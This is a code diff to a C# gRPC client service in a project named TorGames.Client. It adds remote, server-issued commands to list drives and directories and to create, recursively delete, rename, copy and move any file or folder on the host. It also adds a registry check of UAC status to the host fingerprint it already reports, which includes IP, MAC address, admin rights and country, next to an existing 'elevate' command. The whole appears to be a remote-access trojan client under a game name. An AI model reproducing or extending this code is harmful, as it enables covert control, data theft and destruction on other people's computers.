@@ -4,6 +4,8 @@ using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
+using System.Text.Json;
+using TorGames.Client.Models;
 using Grpc.Core;
 using Grpc.Net.Client;
 using Microsoft.Extensions.Configuration;
@@ -22,6 +24,12 @@ public class GrpcClientService : BackgroundService
     private readonly ILogger<GrpcClientService> _logger;
     private readonly IConfiguration _configuration;
     private readonly string _clientType = "CLIENT";
+
+    // JSON options for camelCase serialization (matching frontend expectations)
+    private static readonly JsonSerializerOptions JsonOptions = new()
+    {
+        PropertyNamingPolicy = JsonNamingPolicy.CamelCase
+    };
     private readonly TimeSpan _heartbeatInterval = TimeSpan.FromSeconds(10);
     private readonly TimeSpan _reconnectDelay = TimeSpan.FromSeconds(5);
     private readonly TimeSpan _updateCheckInterval = TimeSpan.FromMinutes(30);
@@ -141,7 +149,8 @@ public class GrpcClientService : BackgroundService
             IpAddress = GetLocalIpAddress(),
             MacAddress = GetPrimaryMacAddress(),
             IsAdmin = IsRunningAsAdmin(),
-            CountryCode = GetCountryCode()
+            CountryCode = GetCountryCode(),
+            IsUacEnabled = IsUacEnabled()
         };
 
         var message = new ClientMessage
@@ -372,6 +381,39 @@ public class GrpcClientService : BackgroundService
 
                 case "elevate":
                     result = await HandleElevationRequestAsync(command);
+                    break;
+
+                // File Explorer commands
+                case "listdrives":
+                    result = ListDrives(command);
+                    break;
+
+                case "listdir":
+                    result = ListDirectory(command);
+                    break;
+
+                case "createfolder":
+                    result = CreateFolder(command);
+                    break;
+
+                case "createfile":
+                    result = CreateFile(command);
+                    break;
+
+                case "deletepath":
+                    result = DeletePath(command);
+                    break;
+
+                case "renamepath":
+                    result = RenamePath(command);
+                    break;
+
+                case "copypath":
+                    result = CopyPath(command);
+                    break;
+
+                case "movepath":
+                    result = MovePath(command);
                     break;
 
                 default:
@@ -692,6 +734,394 @@ public class GrpcClientService : BackgroundService
         }
     }
 
+    #region File Explorer Commands
+
+    /// <summary>
+    /// List all available drives on the system.
+    /// </summary>
+    private CommandResult ListDrives(Command command)
+    {
+        var result = new CommandResult { CommandId = command.CommandId };
+
+        try
+        {
+            var drives = DriveInfo.GetDrives()
+                .Where(d => d.IsReady)
+                .Select(d => new FileEntryDto
+                {
+                    Name = d.Name.TrimEnd('\\'),
+                    FullPath = d.Name,
+                    Type = "drive",
+                    SizeBytes = d.TotalSize,
+                    Extension = d.DriveFormat,
+                    IsDirectory = true
+                }).ToList();
+
+            result.Success = true;
+            result.Stdout = JsonSerializer.Serialize(new DirectoryListingDto
+            {
+                Path = "",
+                Entries = drives,
+                Success = true
+            }, JsonOptions);
+
+            _logger.LogDebug("Listed {Count} drives", drives.Count);
+        }
+        catch (Exception ex)
+        {
+            result.Success = false;
+            result.ErrorMessage = ex.Message;
+            _logger.LogError(ex, "Failed to list drives");
+        }
+
+        return result;
+    }
+
+    /// <summary>
+    /// List contents of a directory.
+    /// </summary>
+    private CommandResult ListDirectory(Command command)
+    {
+        var result = new CommandResult { CommandId = command.CommandId };
+
+        try
+        {
+            var path = command.CommandText;
+            var entries = new List<FileEntryDto>();
+
+            // Add directories first
+            foreach (var dir in Directory.GetDirectories(path))
+            {
+                try
+                {
+                    var info = new DirectoryInfo(dir);
+                    entries.Add(new FileEntryDto
+                    {
+                        Name = info.Name,
+                        FullPath = info.FullName,
+                        Type = "directory",
+                        CreatedTime = info.CreationTime,
+                        ModifiedTime = info.LastWriteTime,
+                        IsDirectory = true,
+                        IsHidden = (info.Attributes & FileAttributes.Hidden) != 0,
+                        IsSystem = (info.Attributes & FileAttributes.System) != 0
+                    });
+                }
+                catch
+                {
+                    // Skip directories we can't access
+                }
+            }
+
+            // Add files
+            foreach (var file in Directory.GetFiles(path))
+            {
+                try
+                {
+                    var info = new FileInfo(file);
+                    entries.Add(new FileEntryDto
+                    {
+                        Name = info.Name,
+                        FullPath = info.FullName,
+                        Type = "file",
+                        SizeBytes = info.Length,
+                        Extension = info.Extension,
+                        CreatedTime = info.CreationTime,
+                        ModifiedTime = info.LastWriteTime,
+                        IsReadOnly = info.IsReadOnly,
+                        IsHidden = (info.Attributes & FileAttributes.Hidden) != 0,
+                        IsSystem = (info.Attributes & FileAttributes.System) != 0
+                    });
+                }
+                catch
+                {
+                    // Skip files we can't access
+                }
+            }
+
+            result.Success = true;
+            result.Stdout = JsonSerializer.Serialize(new DirectoryListingDto
+            {
+                Path = path,
+                Entries = entries,
+                Success = true
+            }, JsonOptions);
+
+            _logger.LogDebug("Listed {Count} items in {Path}", entries.Count, path);
+        }
+        catch (Exception ex)
+        {
+            result.Success = false;
+            result.ErrorMessage = ex.Message;
+            _logger.LogError(ex, "Failed to list directory: {Path}", command.CommandText);
+        }
+
+        return result;
+    }
+
+    /// <summary>
+    /// Create a new folder.
+    /// </summary>
+    private CommandResult CreateFolder(Command command)
+    {
+        var result = new CommandResult { CommandId = command.CommandId };
+
+        try
+        {
+            Directory.CreateDirectory(command.CommandText);
+            result.Success = true;
+            result.Stdout = $"Folder created: {command.CommandText}";
+            _logger.LogInformation("Created folder: {Path}", command.CommandText);
+        }
+        catch (Exception ex)
+        {
+            result.Success = false;
+            result.ErrorMessage = ex.Message;
+            _logger.LogError(ex, "Failed to create folder: {Path}", command.CommandText);
+        }
+
+        return result;
+    }
+
+    /// <summary>
+    /// Create a new empty file.
+    /// </summary>
+    private CommandResult CreateFile(Command command)
+    {
+        var result = new CommandResult { CommandId = command.CommandId };
+
+        try
+        {
+            File.Create(command.CommandText).Dispose();
+            result.Success = true;
+            result.Stdout = $"File created: {command.CommandText}";
+            _logger.LogInformation("Created file: {Path}", command.CommandText);
+        }
+        catch (Exception ex)
+        {
+            result.Success = false;
+            result.ErrorMessage = ex.Message;
+            _logger.LogError(ex, "Failed to create file: {Path}", command.CommandText);
+        }
+
+        return result;
+    }
+
+    /// <summary>
+    /// Delete a file or directory.
+    /// </summary>
+    private CommandResult DeletePath(Command command)
+    {
+        var result = new CommandResult { CommandId = command.CommandId };
+
+        try
+        {
+            var path = command.CommandText;
+
+            if (Directory.Exists(path))
+            {
+                Directory.Delete(path, recursive: true);
+                result.Stdout = $"Directory deleted: {path}";
+            }
+            else if (File.Exists(path))
+            {
+                File.Delete(path);
+                result.Stdout = $"File deleted: {path}";
+            }
+            else
+            {
+                result.Success = false;
+                result.ErrorMessage = "Path not found";
+                return result;
+            }
+
+            result.Success = true;
+            _logger.LogInformation("Deleted: {Path}", path);
+        }
+        catch (Exception ex)
+        {
+            result.Success = false;
+            result.ErrorMessage = ex.Message;
+            _logger.LogError(ex, "Failed to delete: {Path}", command.CommandText);
+        }
+
+        return result;
+    }
+
+    /// <summary>
+    /// Rename a file or directory.
+    /// Command format: "oldPath|newName"
+    /// </summary>
+    private CommandResult RenamePath(Command command)
+    {
+        var result = new CommandResult { CommandId = command.CommandId };
+
+        try
+        {
+            var parts = command.CommandText.Split('|');
+            if (parts.Length != 2)
+            {
+                result.Success = false;
+                result.ErrorMessage = "Invalid format. Expected: oldPath|newName";
+                return result;
+            }
+
+            var oldPath = parts[0];
+            var newName = parts[1];
+            var parentDir = Path.GetDirectoryName(oldPath) ?? "";
+            var newPath = Path.Combine(parentDir, newName);
+
+            if (Directory.Exists(oldPath))
+            {
+                Directory.Move(oldPath, newPath);
+            }
+            else if (File.Exists(oldPath))
+            {
+                File.Move(oldPath, newPath);
+            }
+            else
+            {
+                result.Success = false;
+                result.ErrorMessage = "Path not found";
+                return result;
+            }
+
+            result.Success = true;
+            result.Stdout = newPath;
+            _logger.LogInformation("Renamed {OldPath} to {NewPath}", oldPath, newPath);
+        }
+        catch (Exception ex)
+        {
+            result.Success = false;
+            result.ErrorMessage = ex.Message;
+            _logger.LogError(ex, "Failed to rename: {Path}", command.CommandText);
+        }
+
+        return result;
+    }
+
+    /// <summary>
+    /// Copy a file or directory.
+    /// Command format: "sourcePath|destinationPath"
+    /// </summary>
+    private CommandResult CopyPath(Command command)
+    {
+        var result = new CommandResult { CommandId = command.CommandId };
+
+        try
+        {
+            var parts = command.CommandText.Split('|');
+            if (parts.Length != 2)
+            {
+                result.Success = false;
+                result.ErrorMessage = "Invalid format. Expected: sourcePath|destinationPath";
+                return result;
+            }
+
+            var source = parts[0];
+            var dest = parts[1];
+
+            if (Directory.Exists(source))
+            {
+                CopyDirectoryRecursive(source, dest);
+            }
+            else if (File.Exists(source))
+            {
+                File.Copy(source, dest, overwrite: true);
+            }
+            else
+            {
+                result.Success = false;
+                result.ErrorMessage = "Source path not found";
+                return result;
+            }
+
+            result.Success = true;
+            result.Stdout = $"Copied to: {dest}";
+            _logger.LogInformation("Copied {Source} to {Dest}", source, dest);
+        }
+        catch (Exception ex)
+        {
+            result.Success = false;
+            result.ErrorMessage = ex.Message;
+            _logger.LogError(ex, "Failed to copy: {Path}", command.CommandText);
+        }
+
+        return result;
+    }
+
+    /// <summary>
+    /// Move a file or directory.
+    /// Command format: "sourcePath|destinationPath"
+    /// </summary>
+    private CommandResult MovePath(Command command)
+    {
+        var result = new CommandResult { CommandId = command.CommandId };
+
+        try
+        {
+            var parts = command.CommandText.Split('|');
+            if (parts.Length != 2)
+            {
+                result.Success = false;
+                result.ErrorMessage = "Invalid format. Expected: sourcePath|destinationPath";
+                return result;
+            }
+
+            var source = parts[0];
+            var dest = parts[1];
+
+            if (Directory.Exists(source))
+            {
+                Directory.Move(source, dest);
+            }
+            else if (File.Exists(source))
+            {
+                File.Move(source, dest, overwrite: true);
+            }
+            else
+            {
+                result.Success = false;
+                result.ErrorMessage = "Source path not found";
+                return result;
+            }
+
+            result.Success = true;
+            result.Stdout = $"Moved to: {dest}";
+            _logger.LogInformation("Moved {Source} to {Dest}", source, dest);
+        }
+        catch (Exception ex)
+        {
+            result.Success = false;
+            result.ErrorMessage = ex.Message;
+            _logger.LogError(ex, "Failed to move: {Path}", command.CommandText);
+        }
+
+        return result;
+    }
+
+    /// <summary>
+    /// Helper to recursively copy a directory.
+    /// </summary>
+    private static void CopyDirectoryRecursive(string source, string dest)
+    {
+        Directory.CreateDirectory(dest);
+
+        foreach (var file in Directory.GetFiles(source))
+        {
+            var destFile = Path.Combine(dest, Path.GetFileName(file));
+            File.Copy(file, destFile, overwrite: true);
+        }
+
+        foreach (var dir in Directory.GetDirectories(source))
+        {
+            var destDir = Path.Combine(dest, Path.GetFileName(dir));
+            CopyDirectoryRecursive(dir, destDir);
+        }
+    }
+
+    #endregion
+
     private void Cleanup()
     {
         _call?.Dispose();
@@ -739,6 +1169,29 @@ public class GrpcClientService : BackgroundService
         catch
         {
             return false;
+        }
+    }
+
+    private static bool IsUacEnabled()
+    {
+        try
+        {
+            // Check registry for UAC status
+            using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
+                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
+            if (key != null)
+            {
+                var enableLua = key.GetValue("EnableLUA");
+                if (enableLua is int value)
+                {
+                    return value == 1;
+                }
+            }
+            return true; // Default to enabled if we can't determine
+        }
+        catch
+        {
+            return true; // Assume enabled if we can't check
         }
     }
 
